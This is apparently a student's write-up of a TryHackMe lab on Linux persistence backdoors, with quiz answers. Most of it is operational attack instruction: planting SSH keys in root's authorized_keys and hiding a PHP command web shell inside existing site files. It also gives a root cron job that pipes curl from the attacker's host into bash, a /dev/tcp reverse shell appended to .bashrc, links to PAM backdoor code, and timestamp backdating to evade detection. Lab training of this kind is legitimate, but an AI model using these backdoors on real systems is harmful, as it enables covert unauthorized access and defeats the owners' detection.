# Linux Backdoors

**Date:** 17, May, 2021

**Author:** Dhilip Sanjay S

---
[Click Here](https://tryhackme.com/room/linuxbackdoors) to go to the TryHackMe room.

## Introduction
- A **backdoor** is simply something we can do to ensure our consistent access to the machine.
- So even if the machine is rebooted, shut down or whatever, we would still be able to have access to it. 

---

## SSH Backdoors
- The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory. Usually the user would be root as it’s the user with the highest privileges.
- Steps:
    1. Run `ssh-keygen` in your local machine.
    2. Add the public key to `authorized_keys` in the `root/.ssh` directory of the target machine. 
        - Ensure proper permissions: `chmod 600 ~/.ssh/authorized_keys`
    3. Now that we have left our backdoor, we can simply login as **root** using the following commands:
        - `chmod 600 id_rsa` (This is necessary because if we don't do it, ssh will complain about permissions not being secure enough on the key)
        - `ssh -i id_rsa root@ip` to login into our desired machine.

- **Note:** This backdoor *isn't hidden at all*. Anybody with the right permissions would be able to remove our ssh public key or the file authorized_keys entirely.

### In what directory do we place our keys ?
- **Answer:** .ssh

### What flag in ssh do we use to show our private key?
- **Answer:** -i

---

## PHP Backdoors

- If you get root access on a Linux host, you will most likely search for creds and or any useful information in the web root. The web root is usually located in : `/var/www/html`.

- You can create a php file with any name and put the following piece of code:

<script src="https://gist.github.com/DhilipSanjay/ce5155652a9b92b1d53809272c607a0c.js"></script>

- Notice that we are using : `$_REQUEST['cmd'])`, which means that you can pass that parameter either in GET or in POST data.

- To access the shell:

```
- If you left the file in /var/www/html/shell.php | You should be able to access it directly using : http://ip/shell.php

- If you left the shell somewhere else, look in what directory it is and then try accessing it by doing something like that : http://ip/somedirectory/shell.php
```

- Here are some ways that we could make this backdoor a little more hidden:

```
1. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.

2. Change the "cmd" parameter to something else... anything actually... just change it to something that isn't that common. "Cmd" is really common and is already really well known in the hacking community.
```

## CronJob Backdoors

- View the contents of `/etc/crontab`:

```bash
$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

- This represents all the tasks that are scheduled to run at some time on your machine.
- In the example above, you can see that there is a "*" symbol under the "h". This means that the following task would run every hour.
- Add this line into our cronjob file (* for everything -> our task will run every minute, every hour, every day , etc.):

```bash
* *     * * *   root    curl http://<yourip>:8080/shell | bash
```

- The contents of the shell file:

```bash
#!/bin/bash

bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

- We would have to run an HTTP server serving our shell using `python3 -m http.server 8080`
- Don't forget to listen on your specified port with: `nc -lvnp <port>`
- **Note:** Please note that this backdoor isn't really hidden because everyone can see it just by looking inside `/etc/crontab`.

### What does the letter "m" mean in cronjobs?
- **Answer:** minute

### What does the letter "h" mean in cronjobs?
- **Answer:** hour

---

## .bashrc Backdoors

- If a user has bash as their login shell, the **.bashrc** file in their home directory is executed when an interactive session is launched.

- You could simply run this command to include your reverse shell into their **.bashrc**.

```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

- **Note:** 
    - One important thing is to always have your nc listener ready as you don't know when your user will log on.
    - This attack is very sneaky as nobody really thinks about ever checking their **.bashrc** file.
    - On the other hand, you can't exactly know if any of the user's will actually login to their system, so you might really wait a long period of time.

---

## pam_unix.so Backdoors

- **pam_unix.so** is one of many files in Linux that is responsible for **authentication**.

- References
    - [Creating Backdoor in PAM](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html)
    - [Linux PAM Backdoor - Script](https://github.com/zephrax/linux-pam-backdoor)

---

## Making Detection More Difficult

- To make detection of all of these backdoors more difficult one can adjust modification time of the created files (this is what ls command shows) to a past date:

```bash
touch -t YYYYMMDDhhmm <file>
```

---

## References
- [9 Ways to backdoor Linux](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)